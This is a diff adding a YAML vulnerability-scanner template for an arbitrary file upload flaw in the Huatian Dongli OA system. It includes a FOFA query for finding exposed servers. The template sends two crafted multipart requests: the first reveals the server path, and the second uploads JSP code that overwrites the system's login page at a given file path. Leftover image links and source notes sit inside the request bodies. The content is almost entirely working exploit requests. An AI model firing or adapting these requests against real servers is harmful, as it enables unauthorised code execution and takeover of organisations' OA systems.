@@ -1,0 +1,89 @@
+id: poc-tntgnxc43y1ddhkq
+info:
+  name: 华天动力OA系统upload.jsp任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tntgnxc43y1ddhkq'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tntgnxc43y1ddhkq
+    fofa: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
+http:
+- raw:
+  - 'POST /OAapp/jsp/upload.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Length: 293
+
+
+    ------WebKitFormBoundary5Ur8laykKAWws2QO
+
+    Content-Disposition: form-data; name="file"; filename="xxx.xml"
+
+    Content-Type: image/png
+
+
+    real path
+
+    ------WebKitFormBoundary5Ur8laykKAWws2QO
+
+    Content-Disposition: form-data; name="filename"
+
+
+    xxx.png
+
+    ------WebKitFormBoundary5Ur8laykKAWws2QO--
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733741898627-5cbe8e7d-b848-4236-b227-5c910edca801.png)
+
+    将“123”写入到normalLoginPageForOther.jsp文件中去'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Length: 389
+
+
+    ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+
+    Content-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"
+
+    Content-Type: image/png
+
+
+    <%out.print("123");%>
+
+    ------WebKitFormBoundaryzRSYXfFlXqk6btQm
+
+    Content-Disposition: form-data; name="newFileName"
+
+
+    D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
+
+    ------WebKitFormBoundaryzRSYXfFlXqk6btQm--
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733741898922-a701003d-d469-4393-a706-54a5b94f9b1c.png)
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733741899155-1a98b374-f32b-4eda-8935-a4e30e3f27ba.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
